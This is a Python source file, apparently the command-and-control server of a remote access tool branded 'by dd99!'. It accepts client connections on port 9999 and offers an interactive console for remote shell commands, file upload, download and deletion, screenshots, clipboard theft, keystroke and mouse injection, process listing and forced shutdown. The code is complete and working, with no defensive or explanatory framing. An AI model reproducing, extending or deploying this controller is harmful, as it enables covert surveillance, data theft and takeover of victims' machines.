import socket
import os
import threading
import time

HOST = "0.0.0.0" # Listen on all interfaces, including the VPN tunnel
PORT = 9999      # Matches "Local Port" in image_82d86a.png

def send_file(file_path, conn):
    """Send file from server to client""" 
    try:
        with open(file_path, "rb") as f:
            while chunk := f.read(1024):
                conn.send(chunk)
        conn.send(b"<ENDUPLOAD>")
        print(f"[+] File '{file_path}' sent successfully")
    except Exception as e:
        print(f"[-] Failed to send file: {str(e)}")

def receive_file(conn, dest_filename):
    """Receive file from client to server"""
    try:
        with open(dest_filename, "wb") as f:
            while True:
                chunk = conn.recv(1024)
                if b"<ENDDOWNLOAD>" in chunk:
                    f.write(chunk.replace(b"<ENDDOWNLOAD>", b""))
                    break
                f.write(chunk)
        print(f"[+] File saved as '{dest_filename}'")
    except Exception as e:
        print(f"[-] Failed to receive file: {str(e)}")

def receive_screenshot(conn):
    """Receive screenshot from client"""
    try:
        data = b""
        while True:
            chunk = conn.recv(4096)
            if b"<ENDSCREENSHOT>" in chunk:
                data += chunk.replace(b"<ENDSCREENSHOT>", b"")
                break
            data += chunk

        # Generate unique filename with timestamp
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"

        with open(filename, "wb") as f:
            f.write(data)
        print(f"[+] Screenshot saved as '{filename}'")
    except Exception as e:
        print(f"[-] Failed to receive screenshot: {str(e)}")

def print_help():
    """Display available commands"""
    help_text = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                           REMOTE ACCESS TOOL - COMMANDS                       ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║ SYSTEM INFORMATION:                                                           ║
║   sysinfo          - Show detailed system information (CPU, GPU, RAM, etc.)  ║
║   whoami           - Show current username                                    ║
║   processes        - List all running processes                              ║
║                                                                               ║
║ NAVIGATION & FILES:                                                           ║
║   cwd              - Show current working directory                          ║
║   cd <path>        - Change directory                                        ║
║   list <path>      - List directory contents                                 ║
║   tree <path>      - Show directory tree structure                           ║
║   search <filename>- Search for files                                        ║
║                                                                               ║
║ FILE OPERATIONS:                                                              ║
║   upload <filename>- Upload file from server to client                       ║
║   download <path>  - Download file from client to server                     ║
║   delete <path>    - Delete file or directory                                ║
║   move <src> <dst> - Move/rename files or directories                        ║
║                                                                               ║
║ REMOTE CONTROL:                                                               ║
║   mousemove <x> <y>- Move mouse cursor to coordinates                        ║
║   click            - Perform left mouse click                                ║
║   rightclick       - Perform right mouse click                               ║
║   type <text>      - Type text                                               ║
║   paste <text>     - Paste text using clipboard                              ║
║   copyclip         - Get current clipboard content                           ║
║   screenshot       - Take and receive screenshot                             ║
║                                                                               ║
║ APPLICATIONS:                                                                 ║
║   run <app>        - Launch application                                      ║
║   close <app>      - Close application by name                               ║
║                                                                               ║
║ SYSTEM CONTROL:                                                               ║
║   shell <command>  - Execute shell command                                   ║
║   shutdown         - Shutdown the system                                     ║
║   restart          - Restart the system                                      ║
║   logoff           - Log off current user                                    ║
║   lock             - Lock the screen                                         ║
║   hibernate        - Hibernate the system                                    ║
║                                                                               ║
║ CONNECTION:                                                                   ║
║   close            - Close connection (client stays running)                 ║
║   exit             - Exit both client and server                             ║
║   help             - Show this help menu                                     ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """
    print(help_text)

def handle_client(client, addr):
    """Handle client connection and commands"""
    print(f"[+] Connected to {addr}")

    while True:
        try:
            # Show prompt and get command
            command = input(f"\n{addr[0]}:{addr[1]} >> ").strip()

            if not command:
                continue

            # Handle help command locally
            if command.lower() in ["help", "?", "h"]:
                print_help()
                continue

            # Handle exit command
            if command.lower() == "exit":
                print("[!] Sending exit command to client...")
                client.send(command.encode())
                break

            # Handle upload command (server -> client)
            elif command.startswith("upload "):
                filename = command[7:].strip()
                if not filename:
                    print("[-] Usage: upload <filename>")
                    continue

                # Check if file exists on server
                if not os.path.exists(filename):
                    print(f"[-] File '{filename}' not found on server")
                    continue

                print(f"[*] Uploading '{filename}' to client...")
                client.send(command.encode())

                # Wait for client ready signal
                response = client.recv(1024).decode()
                if "[READY]" in response:
                    send_file(filename, client)
                    # Get confirmation from client
                    response = client.recv(1024).decode()
                    print(response.strip())
                else:
                    print("[-] Client not ready for upload")

            # Handle download command (client -> server)
            elif command.startswith("download "):
                filepath = command[9:].strip()
                if not filepath:
                    print("[-] Usage: download <path>")
                    continue

                print(f"[*] Downloading '{filepath}' from client...")
                client.send(command.encode())

                # Receive the file
                filename = os.path.basename(filepath)
                if not filename:
                    filename = "downloaded_file"

                receive_file(client, filename)

            # Handle screenshot command
            elif command.lower() == "screenshot":
                print("[*] Requesting screenshot from client...")
                client.send(command.encode())
                receive_screenshot(client)

            # Handle all other commands
            else:
                client.send(command.encode())

                # Receive response with timeout handling
                client.settimeout(10.0)  # 10 second timeout
                try:
                    response = client.recv(8192).decode(errors="ignore")
                    if response:
                        print(response.strip())
                    else:
                        print("[-] No response from client")
                except socket.timeout:
                    print("[-] Command timed out")
                except Exception as e:
                    print(f"[-] Error receiving response: {str(e)}")
                finally:
                    client.settimeout(None)  # Remove timeout

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt detected")
            try:
                client.send(b"exit")
            except:
                pass
            break
        except Exception as e:
            print(f"[-] Error: {str(e)}")
            break

    print(f"[!] Connection with {addr} closed")
    client.close()

def main():
    """Main server function"""
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║                          REMOTE ACCESS TOOL BY dd99! - SERVER                          ║")
    print("║                              Listening for connections...                     ║")
    print("╚═══════════════════════════════════════════════════════════════════════════════╝")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[+] Server listening on {HOST}:{PORT}")
        print("[*] Type 'help' for available commands once connected")

        while True:
            try:
                client, addr = s.accept()
                print(f"\n[+] New connection from {addr}")

                # Handle each client in the main thread for interactive control
                handle_client(client, addr)

            except KeyboardInterrupt:
                print("\n[!] Server shutting down...")
                break
            except Exception as e:
                print(f"[-] Error accepting connection: {str(e)}")
                continue

    except Exception as e:
        print(f"[-] Server error: {str(e)}")
    finally:
        s.close()
        print("[+] Server closed")

if __name__ == "__main__":
    main()